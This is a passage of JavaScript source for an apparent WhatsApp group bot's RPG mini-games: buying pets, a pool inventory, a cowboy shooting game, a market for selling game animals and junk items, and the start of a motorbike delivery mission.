            if(user.pet < hcentaur) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hcentaur
            global.db.users[m.sender].centaur += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'kyubi':
          if (user.kyubi > 0) return m.reply('You already have this')
            if(user.pet < hkyubi) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hkyubi
            global.db.users[m.sender].kyubi += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'griffin':
          if (user.griffin > 0) return m.reply('You already have this')
            if(user.pet < hgriffin) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hgriffin
            global.db.users[m.sender].griffin += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'phonix':
          if (user.phonix > 0) return m.reply('You already have this')
            if(user.pet < hphonix) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hphonix
            global.db.users[m.sender].phonix += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'wolf':
          if (user.wolf > 0) return m.reply('You already have this')
            if(user.pet < hwolf) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hwolf
            global.db.users[m.sender].wolf += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            
          default:
              return await m.reply(`${logo}\n${caption}`)
            //return await conn.sendMessage(m.chat, listMessage)
        }
    } else if (/enchant|enchan/i.test(command)) {
      const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
      switch (_type) {
        case 't':
          break
        case '':
          break

        default:
          return Dare.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
      }
    }
  } catch (err) {
    m.reply("Error\n\n\n" + err.stack)
  }
  }
  break
//==================================================================
case 'kolam':
case 'pool': {
  if (!m.isGroup) return reply(mess.only.group)
let user = global.db.users[m.sender]
let past = `
╭━━━━「 *BIO* 」   
┊ *💌 Name :* ${user.registered ? user.name : Dare.getName(m.sender)}
┊ *📊 Level :* ${user.level}
┊ *🙂 Exp :* ${user.exp}
╰═┅═━––––––─ׄ✧

╭━━━━「 *ISI* 」
┊🦀 Crab: ${user.kepiting}
┊🦞 Lobster: ${user.lobster}
┊🦐 Udang: ${user.udang}
┊🦑 Cumi: ${user.cumi}
┊🐙 Gurita: ${user.gurita}
┊🐡 Buntal: ${user.buntal}
┊🐠 Dory: ${user.dory}
┊🐳 Orca: ${user.orca}
┊🐬 Lumba: ${user.lumba}
┊🐋 Paus: ${user.paus}
┊🦈 Hiu: ${user.hiu}
╰═┅═━––––––─ׄ✧
🎏 Total Isi: *${user.kepiting + user.lobster + user.udang + user.cumi + user.gurita + user.buntal + user.dory + user.orca + user.lumba + user.paus + user.hiu}* Jenis`
  m.reply(past)
  }
break
//==================================================================
case 'koboy':
case 'cowboy': {
  if (!m.isGroup) return reply(mess.only.group)
function random(arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}
	try {
  Dare.tembak = Dare.tembak || { musuh: [], tembak: [] }
   if(/kiri/i.test(text)) {

    let kiri = [
      ["🤠", "-", "-", "-", "-"],
      ["-", "🤠", "-", "-", "-"],
      ["-", "-", "🤠", "-", "-"],
      ["-", "-", "-", "🤠", "-"],
      ["-", "-", "-", "-", "🤠"]
    ]

    if(Dare.tembak.tembak.indexOf("🤠") == 0) {
      Dare.tembak.tembak = kiri[0]
    } else if(Dare.tembak.tembak.indexOf("🤠") == 1) {
      Dare.tembak.tembak = kiri[0]
    } else if(Dare.tembak.tembak.indexOf("🤠") == 2) {
      Dare.tembak.tembak = kiri[1]
    } else if(Dare.tembak.tembak.indexOf("🤠") == 3) {
      Dare.tembak.tembak = kiri[2]
    } else if(Dare.tembak.tembak.indexOf("🤠") == 4) {
      Dare.tembak.tembak = kiri[3]
    }

    let pos = Dare.tembak.musuh.join(" ") + "\n\n\n" + Dare.tembak.tembak.join(" ")



    if(Dare.tembak.musuh.indexOf("🥷") === Dare.tembak.tembak.indexOf("🤠")) return Dare.sendButton(m.chat, pos, wm, [
                                                                                              ['Tembak', `${command}shooting cowboy`]             
                                                                                              ])
    return Dare.sendButton(m.chat, pos, wm, [
          ['←', `${command}koboy kiri`], ['→', `${command}right cowboy`]
])
  } else if(/kanan/i.test(text)) {

    let kanan = [
      ["🤠", "-", "-", "-", "-"],
      ["-", "🤠", "-", "-", "-"],
      ["-", "-", "🤠", "-", "-"],
      ["-", "-", "-", "🤠", "-"],
      ["-", "-", "-", "-", "🤠"]
    ]

    if(Dare.tembak.tembak.indexOf("🤠") == 0) {
      Dare.tembak.tembak = kanan[1]
    } else if(Dare.tembak.tembak.indexOf("🤠") == 1) {
      Dare.tembak.tembak = kanan[2]
    } else if(Dare.tembak.tembak.indexOf("🤠") == 2) {
      Dare.tembak.tembak = kanan[3]
    } else if(Dare.tembak.tembak.indexOf("🤠") == 3) {
      Dare.tembak.tembak = kanan[4]
    } else if(Dare.tembak.tembak.indexOf("🤠") == 4) {
      Dare.tembak.tembak = kanan[4]
    }

    let pos = Dare.tembak.musuh.join(" ") + "\n\n\n" + Dare.tembak.tembak.join(" ")



    if(Dare.tembak.musuh.indexOf("🥷") === Dare.tembak.tembak.indexOf("🤠")) return Dare.sendButton(m.chat, pos, wm, [
                                                                                              ['Tembak', `${command}shooting cowboy`]             
                                                                                              ])             
    return Dare.sendButton(m.chat, pos, wm, [
          ['←', `${command}koboy kiri`], ['→', `${command}right cowboy`]
])
  } else if(/tembak/i.test(text)) {

    if(Dare.tembak.tembak.indexOf("🤠") == Dare.tembak.musuh.indexOf("🥷")) {
      Dare.tembak = {}
      global.db.users[m.sender].money += 1000
      m.reply("You win!\n\nMoney += 1000")
    }

  } else {
   let randMusuh = [
      ["🥷", "-", "-", "-", "-"],
      ["-", "🥷", "-", "-", "-"],
      ["-", "-", "🥷", "-", "-"],
      ["-", "-", "-", "🥷", "-"],
      ["-", "-", "-", "-", "🥷"]
    ]
   let randAku = [
      ["🤠", "-", "-", "-", "-"],
      ["-", "🤠", "-", "-", "-"],
      ["-", "-", "🤠", "-", "-"],
      ["-", "-", "-", "🤠", "-"],
      ["-", "-", "-", "-", "🤠"]
    ]

    let musuh = random(randMusuh)
   let aku = random(randAku)

    Dare.tembak.musuh = musuh
    Dare.tembak.tembak = aku

    let pos = Dare.tembak.musuh.join(" ") + "\n\n\n" + Dare.tembak.tembak.join(" ")

    if(Dare.tembak.musuh.indexOf("🥷") === Dare.tembak.tembak.indexOf("🤠")) return Dare.sendButton(m.chat, pos, wm, [
                                                                                              ['Tembak', `${command}koboy tembak`]             
                                                                                              ])
    return Dare.sendButton(m.chat, pos, wm, [
          ['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
  }
  } catch (e) {
  	throw false
  }
}
break
//==================================================================
case 'pasar':
case 'market': {
  if (!m.isGroup) return reply(mess.only.group)
const Skepiting = 7000
const Slobster = 7000
const Sudang = 7000
const Scumi = 7000
const Sgurita = 7000
const Sbuntal = 7000
const Sdory = 7000
const Sorca = 7000
const Slumba = 7000
const Spaus = 7000
const Sikan = 7000
const Shiu = 7000
const Sbanteng = 9000
const Sharimau = 9000
const Sgajah = 9000
const Skambing = 9000
const Spanda = 9000
const Sbuaya = 9000
const Skerbau = 9000
const Ssapi= 9000
const Smonyet = 9000
const Sbabihutan = 9000
const Sbabi = 9000
const Sayam = 9000
const Sbotol = 100
const Skardus = 100
const Skaleng = 100
const Sgelas = 100
const Splastik = 100

    const _armor = global.db.users[m.sender].armor
    const armor = (_armor == 0 ? 20000 : '' || _armor == 1 ? 49999 : '' || _armor == 2 ? 99999 : '' || _armor == 3 ? 149999 : '' || _armor == 4 ? 299999 : '')
    let type = (args[0] || '').toLowerCase()
    let _type = (args[1] || '').toLowerCase()
    let jualbeli = (args[0] || '').toLowerCase()
    const Kchat = `╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Marine Animals | 💲 Selling Price*\n═┅═━––––––━––––––๑
🦀 Crab: ${Skepiting}
🦞 Lobster: ${Slobster}
🦐 Shrimp: ${Sudang}
🦑 Squid: ${Scumi}
🐙 Octopus: ${Sgurita}
🐡 Bloated: ${Sbuntal}
🐠 Dory: ${Sdory}
🐳 Orca: ${Sorca}
🐬 Racing: ${Slumba}
🐋 Pope: ${Spaus}
🦈 Shark: ${Shiu}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Land Animals | 💲 Selling Price*\n═┅═━––––––━––––––๑
🐃 Bull: ${Sbanteng}
🐅 Tiger: ${Sharimau}
🐘 Elephant: ${Sgajah}
🐐 Goat: ${Skambing}
🐼 Panda: ${Spanda}
🐃 Buffalo: ${Skerbau}
🐊 Crocodile: ${Sbuaya}
🐂 Cow: ${Ssapi}
🐒 Monkey: ${Smonyet}
🐗 Wild boar: ${Sbabihutan}
🐖 Pig: ${Sbabi}
🐔 Chicken: ${Sayam}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
📌 *Usage example :*\n═┅═━––––––━––––––๑
#market selling chickens [Number]
`.trim()
    try {
        if (/pasar|toko/i.test(command)) {
            const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
            const sampah = global.db.users[m.sender].sampah
            switch (jualbeli) {

            case 'jual': 
                switch (_type) {                  
                     case 'banteng':
                        if (global.db.users[m.sender].banteng >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].banteng -= count * 1
                            reply( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
                        } else reply( `Banteng you are not enough`.trim())
                        break
                        case 'harimau':
                        if (global.db.users[m.sender].harimau >= count * 1) {
                            global.db.users[m.sender].money += Sharimau * count
                            global.db.users[m.sender].harimau -= count * 1
                            reply( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
                        } else reply( `Harimau you are not enough`.trim())
                        break
                        case 'gajah':
                        if (global.db.users[m.sender].gajah >= count * 1) {
                            global.db.users[m.sender].money += Sgajah * count
                            global.db.users[m.sender].gajah -= count * 1
                            reply( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
                        } else reply( `Gajah you are not enough`.trim())
                        break
                        case 'kambing':
                        if (global.db.users[m.sender].kambing >= count * 1) {
                            global.db.users[m.sender].money += Skambing * count
                            global.db.users[m.sender].kambing -= count * 1
                            reply( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
                        } else reply( `Kambing you are not enough`.trim())
                        break
                        case 'panda':
                        if (global.db.users[m.sender].panda >= count * 1) {
                            global.db.users[m.sender].money += Spanda * count
                            global.db.users[m.sender].panda -= count * 1
                            reply( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Panda you are not enough`.trim())
                        break
                        case 'buaya':
                        if (global.db.users[m.sender].buaya >= count * 1) {
                            global.db.users[m.sender].money += Sbuaya * count
                            global.db.users[m.sender].buaya -= count * 1
                            reply( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Buaya you are not enough`.trim())
                        break
                        case 'kerbau':
                        if (global.db.users[m.sender].kerbau >= count * 1) {
                            global.db.users[m.sender].money += Skerbau * count
                            global.db.users[m.sender].kerbau -= count * 1
                            reply( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
                        } else reply( `Kerbau you are not enough`.trim())
                        break
                        case 'sapi':
                        if (global.db.users[m.sender].sapi >= count * 1) {
                            global.db.users[m.sender].money += Ssapi * count
                            global.db.users[m.sender].sapi -= count * 1
                            reply( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
                        } else reply( `Sapi you are not enough`.trim())
                        break
                        case 'monyet':
                        if (global.db.users[m.sender].monyet >= count * 1) {
                            global.db.users[m.sender].money += Smonyet * count
                            global.db.users[m.sender].monyet -= count * 1
                            reply( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
                        } else reply( `Monyet you are not enough`.trim())
                        break
                        case 'babi':
                        if (global.db.users[m.sender].babi >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].babi -= count * 1
                            reply( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
                        } else reply( `Babi you are not enough`.trim())
                        break
                        case 'babihutan':
                        if (global.db.users[m.sender].babihutan >= count * 1) {
                            global.db.users[m.sender].money += Sbabihutan * count
                            global.db.users[m.sender].babihutan -= count * 1
                            reply( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
                        } else reply( `Babi Hutan you are not enough`.trim())
                        break
                        case 'ayam':
                        if (global.db.users[m.sender].ayam >= count * 1) {
                            global.db.users[m.sender].money += Sayam * count
                            global.db.users[m.sender].ayam -= count * 1
                            reply( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
                        } else reply( `Ayam you are not enough`.trim())
                        break
                        //mancing
                        case 'kepiting':
                        if (global.db.users[m.sender].kepiting >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].kepiting -= count * 1
                            reply( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
                        } else reply( `Kepiting you are not enough`.trim())
                        break
                        case 'ikan':
                        if (global.db.users[m.sender].ikan >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].ikan -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
                        } else reply( `Ikan you are not enough`.trim())
                        break
                        case 'dory':
                        if (global.db.users[m.sender].dory >= count * 1) {
                            global.db.users[m.sender].money += Sdory * count
                            global.db.users[m.sender].dory -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
                        } else reply( `Ikan Dory you are not enough`.trim())
                        break
                        case 'gurita':
                        if (global.db.users[m.sender].gurita >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].gurita -= count * 1
                            reply( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
                        } else reply( `Gurita you are not enough`.trim())
                        break
                        case 'buntal':
                        if (global.db.users[m.sender].buntal >= count * 1) {
                            global.db.users[m.sender].money += Sbuntal * count
                            global.db.users[m.sender].buntal -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
                        } else reply( `Ikan Buntal you are not enough`.trim())
                        break
                        case 'hiu':
                        if (global.db.users[m.sender].hiu >= count * 1) {
                            global.db.users[m.sender].money += Shiu * count
                            global.db.users[m.sender].hiu -= count * 1
                            reply( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
                        } else reply( `Hiu you are not enough`.trim())
                        break
                        case 'orca':
                        if (global.db.users[m.sender].orca >= count * 1) {
                            global.db.users[m.sender].money += Sorca * count
                            global.db.users[m.sender].orca -= count * 1
                            reply( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
                        } else reply( `Paus Orca you are not enough`.trim())
                        break
                        case 'lumba':
                        if (global.db.users[m.sender].lumba >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].lumba -= count * 1
                            reply( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
                        } else reply( `Lumba Lumba you are not enough`.trim())
                        break
                        case 'paus':
                        if (global.db.users[m.sender].paus >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].paus -= count * 1
                            reply( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
                        } else reply( `Paus you are not enough`.trim())
                        break
                  case 'lobster':
                        if (global.db.users[m.sender].lobster >= count * 1) {
                            global.db.users[m.sender].money += Slobster * count
                            global.db.users[m.sender].lobster -= count * 1
                            reply( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
                        } else reply( `Lobster you are not enough`.trim())
                        break
                     case 'udang':
                        if (global.db.users[m.sender].udang >= count * 1) {
                            global.db.users[m.sender].money += Sudang * count
                            global.db.users[m.sender].udang -= count * 1
                            reply( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
                        } else reply( `Udang you are not enough`.trim())
                        break
                      case 'cumi':
                        if (global.db.users[m.sender].cumi >= count * 1) {
                            global.db.users[m.sender].money += Scumi * count
                            global.db.users[m.sender].cumi -= count * 1
                            reply( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
                        } else reply( `Cumi you are not enough`.trim())
                         break
                        case 'botol':
                        if (global.db.users[m.sender].botol >= count * 1) {
                            global.db.users[m.sender].money += Sbotol * count
                            global.db.users[m.sender].botol -= count * 1
                            reply( `Sukses Menjual ${count} Cumi Dengan Harga ${Sbotol * count} Money `.trim())
                        } else reply( `Botol you are not enough`.trim())
                        break
                        case 'kaleng':
                        if (global.db.users[m.sender].kaleng >= count * 1) {
                            global.db.users[m.sender].money += Skaleng * count
                            global.db.users[m.sender].kaleng -= count * 1
                            reply( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
                        } else reply( `Kaleng you are not enough`.trim())
                        break
                        case 'kardus':
                        if (global.db.users[m.sender].kardus >= count * 1) {
                            global.db.users[m.sender].money += Skardus * count
                            global.db.users[m.sender].kardus -= count * 1
                            reply( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
                        } else reply( `Kardus you are not enough`.trim())
                        break
                        case 'gelas':
                        if (global.db.users[m.sender].gelas >= count * 1) {
                            global.db.users[m.sender].money += Sgelas * count
                            global.db.users[m.sender].gelas -= count * 1
                            reply( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
                        } else reply( `Gelas you are not enough`.trim())
                        break
                        case 'plastik':
                        if (global.db.users[m.sender].plastik >= count * 1) {
                            global.db.users[m.sender].money += Splastik * count
                            global.db.users[m.sender].plastik -= count * 1
                            reply( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
                        } else reply( `Plastik you are not enough`.trim())
                        break
                    default:
                        return m.reply(Kchat)
                }
                break
            default:
                return m.reply(Kchat)
            }

        } else if (/sell|jual|/i.test(command)) {
            const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
            switch (type) { 
                       case 'banteng':
                        if (global.db.users[m.sender].banteng >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].banteng -= count * 1
                            reply( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
                        } else reply( `Banteng you are not enough`.trim())
                        break
                        case 'harimau':
                        if (global.db.users[m.sender].harimau >= count * 1) {
                            global.db.users[m.sender].money += Sharimau * count
                            global.db.users[m.sender].harimau -= count * 1
                            reply( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
                        } else reply( `Harimau you are not enough`.trim())
                        break
                        case 'gajah':
                        if (global.db.users[m.sender].gajah >= count * 1) {
                            global.db.users[m.sender].money += Sgajah * count
                            global.db.users[m.sender].gajah -= count * 1
                            reply( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
                        } else reply( `Gajah you are not enough`.trim())
                        break
                        case 'kambing':
                        if (global.db.users[m.sender].kambing >= count * 1) {
                            global.db.users[m.sender].money += Skambing * count
                            global.db.users[m.sender].kambing -= count * 1
                            reply( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
                        } else reply( `Kambing you are not enough`.trim())
                        break
                        case 'panda':
                        if (global.db.users[m.sender].panda >= count * 1) {
                            global.db.users[m.sender].money += Spanda * count
                            global.db.users[m.sender].panda -= count * 1
                            reply( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Panda you are not enough`.trim())
                        break
                        case 'buaya':
                        if (global.db.users[m.sender].buaya >= count * 1) {
                            global.db.users[m.sender].money += Sbuaya * count
                            global.db.users[m.sender].buaya -= count * 1
                            reply( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Buaya you are not enough`.trim())
                        break
                        case 'kerbau':
                        if (global.db.users[m.sender].kerbau >= count * 1) {
                            global.db.users[m.sender].money += Skerbau * count
                            global.db.users[m.sender].kerbau -= count * 1
                            reply( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
                        } else reply( `Kerbau you are not enough`.trim())
                        break
                        case 'sapi':
                        if (global.db.users[m.sender].sapi >= count * 1) {
                            global.db.users[m.sender].money += Ssapi * count
                            global.db.users[m.sender].sapi -= count * 1
                            reply( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
                        } else reply( `Sapi you are not enough`.trim())
                        break
                        case 'monyet':
                        if (global.db.users[m.sender].monyet >= count * 1) {
                            global.db.users[m.sender].money += Smonyet * count
                            global.db.users[m.sender].monyet -= count * 1
                            reply( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
                        } else reply( `Monyet you are not enough`.trim())
                        break
                        case 'babi':
                        if (global.db.users[m.sender].babi >= count * 1) {
                            global.db.users[m.sender].money += Sbabi * count
                            global.db.users[m.sender].babi -= count * 1
                            reply( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
                        } else reply( `Babi you are not enough`.trim())
                        break
                        case 'babihutan':
                        if (global.db.users[m.sender].babihutan >= count * 1) {
                            global.db.users[m.sender].money += Sbabihutan * count
                            global.db.users[m.sender].babihutan -= count * 1
                            reply( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
                        } else reply( `Babi Hutan you are not enough`.trim())
                        break
                        case 'ayam':
                        if (global.db.users[m.sender].ayam >= count * 1) {
                            global.db.users[m.sender].money += Sayam * count
                            global.db.users[m.sender].ayam -= count * 1
                            reply( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
                        } else reply( `Ayam you are not enough`.trim())
                        break
                        //mancing
                        case 'kepiting':
                        if (global.db.users[m.sender].kepiting >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].kepiting -= count * 1
                            reply( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
                        } else reply( `Kepiting you are not enough`.trim())
                        break
                        case 'ikan':
                        if (global.db.users[m.sender].ikan >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].ikan -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
                        } else reply( `Ikan you are not enough`.trim())
                        break
                        case 'dory':
                        if (global.db.users[m.sender].dory >= count * 1) {
                            global.db.users[m.sender].money += Sdory * count
                            global.db.users[m.sender].dory -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
                        } else reply( `Ikan Dory you are not enough`.trim())
                        break
                        case 'gurita':
                        if (global.db.users[m.sender].gurita >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].gurita -= count * 1
                            reply( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
                        } else reply( `Gurita you are not enough`.trim())
                        break
                        case 'buntal':
                        if (global.db.users[m.sender].buntal >= count * 1) {
                            global.db.users[m.sender].money += Sbuntal * count
                            global.db.users[m.sender].buntal -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
                        } else reply( `Ikan Buntal you are not enough`.trim())
                        break
                        case 'hiu':
                        if (global.db.users[m.sender].hiu >= count * 1) {
                            global.db.users[m.sender].money += Shiu * count
                            global.db.users[m.sender].hiu -= count * 1
                            reply( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
                        } else reply( `Hiu you are not enough`.trim())
                        break
                        case 'orca':
                        if (global.db.users[m.sender].orca >= count * 1) {
                            global.db.users[m.sender].money += Sorca * count
                            global.db.users[m.sender].orca -= count * 1
                            reply( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
                        } else reply( `Paus Orca you are not enough`.trim())
                        break
                        case 'lumba':
                        if (global.db.users[m.sender].lumba >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].lumba -= count * 1
                            reply( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
                        } else reply( `Lumba Lumba you are not enough`.trim())
                        break
                        case 'paus':
                        if (global.db.users[m.sender].paus >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].paus -= count * 1
                            reply( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
                        } else reply( `Paus you are not enough`.trim())
                        break
                  case 'lobster':
                        if (global.db.users[m.sender].lobster >= count * 1) {
                            global.db.users[m.sender].money += Slobster * count
                            global.db.users[m.sender].lobster -= count * 1
                            reply( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
                        } else reply( `Lobster you are not enough`.trim())
                        break
                     case 'udang':
                        if (global.db.users[m.sender].udang >= count * 1) {
                            global.db.users[m.sender].money += Sudang * count
                            global.db.users[m.sender].udang -= count * 1
                            reply( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
                        } else reply( `Udang you are not enough`.trim())
                        break
                      case 'cumi':
                        if (global.db.users[m.sender].cumi >= count * 1) {
                            global.db.users[m.sender].money += Scumi * count
                            global.db.users[m.sender].cumi -= count * 1
                            reply( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
                        } else reply( `Cumi you are not enough`.trim())
                         break
                        case 'botol':
                        if (global.db.users[m.sender].botol >= count * 1) {
                            global.db.users[m.sender].money += Sbotol * count
                            global.db.users[m.sender].botol -= count * 1
                            reply( `Sukses Menjual ${count} Botol Dengan Harga ${Sbotol * count} Money `.trim())
                        } else reply( `Botol you are not enough`.trim())
                        break         
                        case 'kaleng':
                        if (global.db.users[m.sender].kaleng >= count * 1) {
                            global.db.users[m.sender].money += Skaleng * count
                            global.db.users[m.sender].kaleng -= count * 1
                            reply( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
                        } else reply( `Kaleng you are not enough`.trim())
                        break        
                        case 'kardus':
                        if (global.db.users[m.sender].kardus >= count * 1) {
                            global.db.users[m.sender].money += Skardus * count
                            global.db.users[m.sender].kardus -= count * 1
                            reply( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
                        } else reply( `Kardus you are not enough`.trim())
                        break
                         case 'gelas':
                        if (global.db.users[m.sender].gelas >= count * 1) {
                            global.db.users[m.sender].money += Sgelas * count
                            global.db.users[m.sender].gelas -= count * 1
                            reply( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
                        } else reply( `Gelas you are not enough`.trim())
                        break
                        case 'plastik':
                        if (global.db.users[m.sender].plastik >= count * 1) {
                            global.db.users[m.sender].money += Splastik * count
                            global.db.users[m.sender].plastik -= count * 1
                            reply( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
                        } else reply( `Plastik you are not enough`.trim())
                        break       
                default:
                    return m.reply(Kchat)
            }
        }
} catch (err) {
console.log(util.format(err))
let e = String(err)
Dare.sendMessage("23481xxxxx@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}
break
//==================================================================
case 'ojek':
case 'bike': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = Dare.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Bike'
    Dare.misi = Dare.misi ? Dare.misi: {}
    if (id in Dare.misi) {
        reply( `Complete the Mission ${Dare.misi[id][0]} Above all`)
        throw false
    }
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let randomaku4 = Math.floor(Math.random() * 10)
        let randomaku5 = Math.floor(Math.random() * 10)

        let rbrb4 = (randomaku4 * 100000)
        let rbrb5 = (randomaku5 * 1000)

        var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       🛵
✔️ Get orders....
`.trim()

        var dimas2 = `
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️
➕ Deliver to destination....
`.trim()

        var dimas3 = `
